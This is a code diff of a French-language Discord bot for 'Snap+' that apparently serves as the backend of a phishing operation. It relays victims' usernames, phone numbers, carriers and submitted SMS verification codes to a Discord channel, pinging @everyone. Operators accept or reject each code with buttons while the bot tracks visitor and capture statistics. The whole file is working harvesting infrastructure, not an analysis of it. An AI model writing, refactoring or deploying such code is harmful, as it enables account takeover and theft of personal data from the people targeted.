@@ -37,123 +37,104 @@ function getPercentage(value, total) {
   return ((value / total) * 100).toFixed(1);
 }
 
-// ======================= CREATION "TYPE 17" =======================
-// Ton exemple : [{ type: 17, accent_color: 0, spoiler:false, components:[ ... ] }]
-function makeType17Embed(components) {
-  return {
-    type: 17,
-    accent_color: 0,
-    spoiler: false,
-    components,
-  };
-}
-
-// Convertit une liste simplifiée => blocks exacts du type 17
-function blocksFromLines(lines) {
-  // Chaque ligne devient { type: 10, content: '...' }
-  // Et on insère un divider quand line === '__DIVIDER__'
-  const out = [];
-  for (const line of lines) {
-    if (line === '__DIVIDER__') {
-      out.push({ type: 14, divider: true, spacing: 2 });
-      continue;
-    }
-    out.push({ type: 10, content: line });
+// ======================= "RICH BLOCKS" => content text =======================
+// On simule le rendu de ton JSON par du texte structuré en content.
+function richTextFromBlocks(blocks) {
+  // blocks = [ { type: 10, content }, { type: 14, divider: true }, ... ]
+  let out = [];
+  for (const b of blocks) {
+    if (b.type === 10 && typeof b.content === 'string') out.push(b.content);
+    if (b.type === 14 && b.divider) out.push(SEPARATOR);
+    // spacing ignored (le rendu se fait avec sauts de ligne)
   }
-  return out;
+  return out.join('\n');
 }
 
-// ======================= TEXTES D'ACTUALITES =======================
-function createInitialBlocks(username, phone, operator) {
-  return blocksFromLines([
-    "# 📱 Nouvelle inscription Snap+",
-    '__DIVIDER__',
-    `### 👤 Nom d'utilisateur: ${username}`,
-    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
-    `### 🏛️ Opérateur: ${operator || 'N/A'}`,
-    `### ⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
-    '__DIVIDER__',
-    "En attente du code...",
-  ]);
+function sendLikeNewInscription(username, phone, operator) {
+  return [
+    { type: 10, content: "# 📱 Nouvelle inscription Snap+" },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
+    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
+    { type: 10, content: `### 🏛️ Opérateur: ${operator || 'N/A'}` },
+    { type: 10, content: `### ⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: "En attente du code..." },
+  ];
 }
 
-function createCodeBlocks(username, phone, code) {
-  return blocksFromLines([
-    "# 🔒 Code de vérification soumis",
-    '__DIVIDER__',
-    `### 👤 Nom d'utilisateur: ${username}`,
-    `### 🔢 Code saisi: \`${code}\``,
-    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
-    `### 📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
-    '__DIVIDER__',
-    "En attente de validation par un modérateur",
-  ]);
+function sendLikeCodeSubmitted(username, phone, code) {
+  return [
+    { type: 10, content: "# 🔒 Code de vérification soumis" },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
+    { type: 10, content: `### 🔢 Code saisi: \`${code}\`` },
+    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
+    { type: 10, content: `### 📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: "En attente de validation par un modérateur" },
+  ];
 }
 
-function createAcceptBlocks(username, phone, code, validatedBy) {
-  return blocksFromLines([
-    "# ✅ Code validé",
-    '__DIVIDER__',
-    `### 👤 Nom d'utilisateur: ${username}`,
-    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
-    `### 🔢 Code: \`${code}\``,
-    `### 📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
-    `### ✅ Validé par: ${validatedBy}`,
-    '__DIVIDER__',
-    "*Utilisateur vérifié*",
-  ]);
+function sendLikeAccept(username, phone, code, validatedBy) {
+  return [
+    { type: 10, content: "# ✅ Code validé" },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
+    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
+    { type: 10, content: `### 🔢 Code: \`${code}\`` },
+    { type: 10, content: `### 📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
+    { type: 10, content: `### ✅ Validé par: ${validatedBy}` },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: "*Utilisateur vérifié*" },
+  ];
 }
 
-function createRejectBlocks(username, phone, code, rejectedBy) {
-  return blocksFromLines([
-    "# 🔒 Code rejeté",
-    '__DIVIDER__',
-    `### 👤 Nom d'utilisateur: ${username}`,
-    `### 🔢 Code saisi: \`${code || 'N/A'}\``,
-    `### 📞 Téléphone: ${formatPhoneNumber(phone)}`,
-    `### 📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
-    `### ❌ Rejeté par: ${rejectedBy}`,
-    '__DIVIDER__',
-    "*L'utilisateur devra ressaisir le code*",
-  ]);
+function sendLikeReject(username, phone, code, rejectedBy) {
+  return [
+    { type: 10, content: "# 🔒 Code rejeté" },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
+    { type: 10, content: `### 🔢 Code saisi: \`${code || 'N/A'}\`` },
+    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
+    { type: 10, content: `### 📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
+    { type: 10, content: `### ❌ Rejeté par: ${rejectedBy}` },
+    { type: 14, divider: true, spacing: 2 },
+    { type: 10, content: "*L'utilisateur devra ressaisir le code*" },
+  ];
 }
 
-// ======================= STATS =======================
-function createStatsType17Components() {
+// ======================= "STATS" en content =======================
+function createStatsText() {
   const uptime = formatUptime(Date.now() - stats.startTime);
   const STATS_SEPARATOR = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
-  return blocksFromLines([
-    `${STATS_SEPARATOR}`,
-    '',
-    '### 👥 **Visiteurs**',
+  return [
+    `${STATS_SEPARATOR}\n`,
+    `### 👥 **Visiteurs**`,
     `🌐 **Total des visites:** \`${stats.totalVisits}\``,
     `👤 **Visiteurs actuels:** \`${stats.currentVisitors}\``,
     `🕐 **Dernière visite:** ${stats.lastVisit || 'Aucune'}`,
-    '',
-    '### 📝 **Inscriptions**',
+    ``,
+    `### 📝 **Inscriptions**`,
     `📱 **Total inscriptions:** \`${stats.totalRegistrations}\``,
     `🕐 **Dernière inscription:** ${stats.lastRegistration || 'Aucune'}`,
-    '',
-    '### 🔐 **Codes de vérification**',
+    ``,
+    `### 🔐 **Codes de vérification**`,
     `📤 **Codes soumis:** \`${stats.totalCodesSubmitted}\``,
     `✅ **Codes acceptés:** \`${stats.codesAccepted}\` (${getPercentage(stats.codesAccepted, stats.totalCodesSubmitted)}%)`,
     `❌ **Codes rejetés:** \`${stats.codesRejected}\` (${getPercentage(stats.codesRejected, stats.totalCodesSubmitted)}%)`,
-    '',
-    '### ⏱️ **Système**',
+    ``,
+    `### ⏱️ **Système**`,
     `🟢 **Uptime:** ${uptime}`,
-    `🔄 **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
-    '',
+    `���� **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
+    ``,
     `${STATS_SEPARATOR}`,
-    '*🔄 Actualisation automatique toutes les 30 secondes*',
-  ]);
+    ``,
+    `*🔄 Actualisation automatique toutes les 30 secondes*`,
+  ].join('\n');
 }
 
-function createStatsType17Embed() {
-  return makeType17Embed(createStatsType17Components());
-}
-
-// ======================= EMBED STATS UPDATE =======================
 async function initStatsEmbed() {
   statsChannelId = process.env.STATS_CHANNEL_ID;
   if (!statsChannelId) {
@@ -164,22 +145,21 @@ async function initStatsEmbed() {
   try {
     const channel = await client.channels.fetch(statsChannelId);
 
-    // Chercher un message existant que le bot a envoyé
     const messages = await channel.messages.fetch({ limit: 10 });
     const existingStats = messages.find(
-      (msg) => msg.author.id === client.user.id && (msg.embeds?.length || 0) > 0
+      (msg) => msg.author.id === client.user.id && (msg.content || '').includes('Statistiques en temps réel - Snap+')
     );
 
-    const embed = createStatsType17Embed();
+    const text = `📊 Statistiques en temps réel - Snap+\n\n${createStatsText()}`;
 
     if (existingStats) {
-      await existingStats.edit({ embeds: [embed] });
+      await existingStats.edit({ content: text });
       statsMessageId = existingStats.id;
-      console.log('✅ Embed de statistiques mis à jour');
+      console.log('✅ Stats mises à jour');
     } else {
-      const msg = await channel.send({ embeds: [embed] });
+      const msg = await channel.send({ content: text });
       statsMessageId = msg.id;
-      console.log('✅ Embed de statistiques créé');
+      console.log('✅ Stats créées');
     }
 
     setInterval(() => updateStatsMessage().catch(() => {}), 30000);
@@ -194,10 +174,18 @@ async function updateStatsMessage() {
   try {
     const channel = await client.channels.fetch(statsChannelId);
     const message = await channel.messages.fetch(statsMessageId);
-    const embed = createStatsType17Embed();
-    await message.edit({ embeds: [embed] });
+
+    const text = `📊 Statistiques en temps réel - Snap+\n\n${createStatsText()}`;
+    await message.edit({ content: text });
   } catch (err) {
     console.error('❌ Erreur mise à jour stats:', err);
+  }
+}
+
+// Fonction appelée par server.js pour mettre à jour les stats
+function updateStatsEmbed() {
+  if (statsMessageId && statsChannelId) {
+    updateStatsMessage().catch(() => {});
   }
 }
 
@@ -213,18 +201,24 @@ client.on('interactionCreate', async (interaction) => {
   const [action, username] = interaction.customId.split(':');
   const user = users[username];
 
-  if (!user) return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });
+  if (!user) {
+    return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });
+  }
 
   if (action === 'accept') {
     user.status = 'verified';
 
-    stats.codesAccepted++;
-
-    const embed = makeType17Embed(
-      createAcceptBlocks(username, user.phone, user.submittedCode, interaction.user.tag)
+    const embedText = richTextFromBlocks(
+      sendLikeAccept(username, user.phone, user.submittedCode, interaction.user.tag)
     );
 
-    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
+    stats.codesAccepted++;
+
+    await interaction.update({
+      content: embedText,
+      components: [],
+    });
+
     updateStatsEmbed();
   }
 
@@ -233,43 +227,38 @@ client.on('interactionCreate', async (interaction) => {
     const rejectedCode = user.submittedCode;
     user.submittedCode = null;
 
-    stats.codesRejected++;
-
-    const embed = makeType17Embed(
-      createRejectBlocks(username, user.phone, rejectedCode, interaction.user.tag)
+    const embedText = richTextFromBlocks(
+      sendLikeReject(username, user.phone, rejectedCode, interaction.user.tag)
     );
 
-    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
+    stats.codesRejected++;
+
+    await interaction.update({
+      content: embedText,
+      components: [],
+    });
+
     updateStatsEmbed();
   }
 });
 
-// Fonction appelée par server.js pour mettre à jour les stats
-function updateStatsEmbed() {
-  if (statsMessageId && statsChannelId) {
-    updateStatsMessage().catch(() => {});
-  }
-}
-
-// ======================= ENVOI MESSAGES =======================
+// ======================= EXPORTS (appelés par server.js) =======================
 async function sendInitialEmbed(username, phone) {
   const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
   const user = users[username];
 
-  const embed = makeType17Embed(
-    createInitialBlocks(username, phone, user?.operator)
-  );
+  const blocks = sendLikeNewInscription(username, phone, user?.operator);
+  const text = richTextFromBlocks(blocks);
 
-  await channel.send({ content: '@everyone', embeds: [embed] });
+  await channel.send({ content: '@everyone\n\n' + text });
 }
 
 async function sendCodeEmbed(username) {
   const user = users[username];
   const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
 
-  const embed = makeType17Embed(
-    createCodeBlocks(username, user.phone, user.submittedCode)
-  );
+  const blocks = sendLikeCodeSubmitted(username, user.phone, user.submittedCode);
+  const text = richTextFromBlocks(blocks);
 
   const row = new ActionRowBuilder().addComponents(
     new ButtonBuilder()
@@ -282,7 +271,7 @@ async function sendCodeEmbed(username) {
       .setStyle(ButtonStyle.Danger)
   );
 
-  await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
+  await channel.send({ content: '@everyone\n\n' + text, components: [row] });
 }
 
 client.login(process.env.BOT_TOKEN);
